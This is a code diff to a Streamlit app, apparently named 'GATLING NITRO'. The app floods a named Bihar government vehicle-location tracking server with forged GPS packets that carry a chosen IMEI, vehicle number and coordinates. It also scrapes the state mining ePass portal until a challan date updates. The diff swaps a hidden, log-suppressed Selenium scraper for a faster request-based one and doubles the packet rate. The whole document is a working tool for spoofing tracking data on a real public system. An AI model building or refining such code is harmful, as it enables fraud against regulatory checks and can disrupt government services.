@@ -2,17 +2,12 @@ import streamlit as st
 import socket
 import time
 from datetime import datetime
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-import os
-import logging
-
-# --- Silent Mode Setup ---
-os.environ['WDM_LOG_LEVEL'] = '0'
-logging.getLogger('selenium').setLevel(logging.CRITICAL)
+import requests
+from bs4 import BeautifulSoup
+import threading
 
 # --- Page Setup ---
-st.set_page_config(page_title="GATLING NITRO V96", page_icon="🚀", layout="wide")
+st.set_page_config(page_title="GATLING NITRO V97", page_icon="🚀", layout="wide")
 
 st.markdown("""
     <style>
@@ -22,8 +17,8 @@ st.markdown("""
     </style>
     """, unsafe_allow_html=True)
 
-st.title("🚀 VLTS GATLING NITRO - V96")
-st.caption("Enterprise Edition - Logic: Ghost Scraper (No Logs)")
+st.title("🚀 VLTS GATLING NITRO - V97")
+st.caption("Enterprise Edition - Logic: Request-based Sync (No Chrome)")
 
 # --- Initialize States ---
 if 'firing' not in st.session_state:
@@ -57,6 +52,36 @@ if c2.button("🛑 STOP & RESET"):
 st.divider()
 m1 = st.empty(); m2 = st.empty()
 
+# --- Portal Sync Logic (Request-based) ---
+def get_portal_date(vehicle_no):
+    try:
+        url = "https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx"
+        session = requests.Session()
+        # Initial Get to capture ViewState
+        r = session.get(url, timeout=5)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        
+        data = {
+            "__VIEWSTATE": soup.find(id="__VIEWSTATE")['value'],
+            "__VIEWSTATEGENERATOR": soup.find(id="__VIEWSTATEGENERATOR")['value'],
+            "__EVENTVALIDATION": soup.find(id="__EVENTVALIDATION")['value'],
+            "txtVehicleNo": vehicle_no,
+            "btnSearch": "Search"
+        }
+        
+        # Post request to search vehicle
+        r_post = session.post(url, data=data, timeout=5)
+        soup_post = BeautifulSoup(r_post.text, 'html.parser')
+        
+        # Finding Challan Date in the table
+        tds = soup_post.find_all('td')
+        for i, td in enumerate(tds):
+            if "Challan Date" in td.text:
+                return tds[i+2].text.strip()
+        return None
+    except:
+        return None
+
 # --- Execution Engine ---
 if st.session_state.firing:
     target = ("vlts.bihar.gov.in", 9999)
@@ -67,55 +92,31 @@ if st.session_state.firing:
         try: sock.connect(target)
         except: st.session_state.firing = False
 
-    # Scraper Setup (Ultra Silent)
-    options = Options()
-    options.add_argument("--headless")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--disable-gpu")
-    options.add_argument("--log-level=3")
-    options.add_experimental_option('excludeSwitches', ['enable-logging'])
-    
-    for path in ["/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome"]:
-        if os.path.exists(path): options.binary_location = path; break
-
     loop_counter = 0
 
     while st.session_state.firing:
-        # 1. High Speed Batch (500 Packets)
+        # 1. High Speed Fire (1000 Packets per cycle)
         now = datetime.now()
         p = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
         
-        for _ in range(500):
+        for _ in range(1000):
             sock.sendto(p, target) if mode == "UDP" else sock.send(p)
         
-        st.session_state.total_count += 500
+        st.session_state.total_count += 1000
         loop_counter += 1
 
-        # UI Metrics Update
+        # UI Update
         m1.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
         m2.metric("Latest Portal Update", st.session_state.last_portal_update)
 
-        # 2. Scraper Check (Every 5 batches)
-        if loop_counter >= 5:
-            try:
-                driver = webdriver.Chrome(options=options)
-                driver.get("https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx")
-                driver.execute_script(f"document.getElementsByName('txtVehicleNo')[0].value = '{vno}';")
-                driver.execute_script("__doPostBack('btnSearch','');")
-                time.sleep(1) # Chhota wait portal update ke liye
-                res = driver.execute_script("""
-                    var td = document.evaluate("//td[contains(text(), 'Challan Date')]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
-                    return td ? td.nextElementSibling.nextElementSibling.innerText.trim() : null;
-                """)
-                driver.quit()
-                if res:
-                    st.session_state.last_portal_update = res
-                    if now.strftime("%d-%b-%Y").upper() in res.upper():
-                        st.session_state.firing = False
-            except:
-                pass
-            loop_counter = 0 
+        # 2. Fast Sync Check (Every 10 cycles)
+        if loop_counter >= 10:
+            res = get_portal_date(vno)
+            if res:
+                st.session_state.last_portal_update = res
+                if now.strftime("%d-%b-%Y").upper() in res.upper():
+                    st.session_state.firing = False
+            loop_counter = 0
         
         time.sleep(0.01)
 
